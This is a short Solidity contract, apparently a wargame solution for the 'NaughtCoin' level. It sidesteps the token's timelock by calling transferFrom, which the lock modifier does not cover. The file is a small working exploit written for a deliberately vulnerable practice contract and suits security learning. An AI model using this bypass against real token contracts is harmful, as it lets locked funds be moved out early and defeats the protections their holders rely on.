// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../interfaces/naughtcoin.sol";

/**
 * This contract will just call the target contract function transferFrom() 
 which has not the customized modifyier testing the timelock implemented
 */
contract naughtcoinAttack {


    NaughtCoin public immutable target; 

    constructor(address payable targetAddress) {
        target=NaughtCoin(targetAddress);
    }

// 
    function attack(uint256 amount) external {
        // uint256 balance = target.balanceOf(msg.sender);
        target.transferFrom(msg.sender, address(this), amount);
    }

    // fallback function
    fallback() payable external{}
}
